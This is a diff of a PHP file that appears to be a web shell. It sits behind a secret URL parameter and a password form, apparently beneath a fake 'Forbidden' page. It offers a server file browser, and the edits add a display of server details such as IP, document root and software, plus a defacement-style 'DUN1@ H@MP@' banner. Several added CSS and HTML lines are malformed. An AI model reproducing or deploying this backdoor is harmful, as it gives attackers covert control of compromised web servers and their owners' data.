@@ -39,7 +39,7 @@ $errorforbidden = $_SERVER['REQUEST_URI'];
 <?php
 if($_GET['030404'] == 'login')
 {
-echo '<br><br><br><br><br><center><form method="post"><input type="password" name="pass"><button>Hai Sir</button></form></center>';
+echo '<br><font color="red"><br><font color="red"><br><font color="red"><br><font color="red"><br><font color="red"><center><form method="post"><input type="password" name="pass"><button>Hai Sir</button></form></center>';
 }
 ?>
 <?php
@@ -123,18 +123,50 @@ border: 1px #c13e1c solid;
 -webkit-border-radius:5px;
 border-radius:5px;
 }
+
+1{
+	color:red;
+			text-decoration: iceland;
+}
+
+2{
+	color:lime;
+	text-decoration: iceland;
+	
+}
+
+3{
+	color:white;
+	text-decoration: iceland;
+	
+}
+
+4{
+	color:gold;
+	text-decoration: iceland;
+
 </style>
 </head>
+<div>
+		
+		<br><font size ="2" color=color="yellow">Your Browser : '.$_SERVER["HTTP_USER_AGENT"].'</br>
+		<br><font size ="2" color= color="red">Software : '.$_SERVER["SERVER_SOFTWARE"].'</br>
+
+		
+		      <hr>
+</div>
 <body>
-     <center><br><br>
-    	<img border="0" src="https://i.ibb.co/yQNq4FS/mahdi-rezaei-hkmfplzlsrq-unsplash-resized.jpg" width="250" height="">
-      
+     <center><br><font color="red"><br><font color="red">
+    	<img border="0" src="https://i.ibb.co/yQNq4FS/mahdi-rezaei-hkmfplzlsrq-unsplash-resized.jpg" width="250" height="250">
+    <br><font size ="2" color= color="red">[ Your IP: '. $_SERVER["REMOTE_ADDR"].' ]<font size ="2" color="blue" > [ Nama Server : '.$_SERVER["SERVER_NAME"].' ]<br><font size ="2" color="white">[ Ip Address : '.$_SERVER["SERVER_ADDR"].' ]<br><font size ="2" color="green">[ Dokumen Root : '.$_SERVER["DOCUMENT_ROOT"].' ]<font size ="2" color="yellow">[ Port : '.$_SERVER["SERVER_PORT"].' ]<font size ="2" color="yellow">[ G-Interface : '.$_SERVER["GATEWAY_INTERFACE"].' ]<font size ="2" color="white">[ R-Method : '.$_SERVER["REQUEST_METHOD"].' ]</br>
+		
 </center>
     <h3><font  color="red"  DUN1@ H@MP@</h3></fon>
    <center><font size="6"> <div  class="greetings">
         * DUN1@ H@MP@ *
-    <br></font>
-<table width="770" border="0" cellpadding="3" cellspacing="1" align="center">
+    
+    <br><font color="red"></font>
+<table width="850" border="3" cellpadding="3" cellspacing="2" align="center">
 <tr><td><font color="white">Path :</font> ';
 if(isset($_GET['path'])){
 $path = $_GET['path'];
@@ -147,7 +179,7 @@ $paths = explode('/',$path);
 foreach($paths as $id=>$pat){
 if($pat == '' && $id == 0){
 $a = true;
-echo '<a href="?path=/">/</a>';
+echo '<a class="fa fa-folder-o" href="?path=/">/</a>';
 continue;
 }
 if($pat == '') continue;
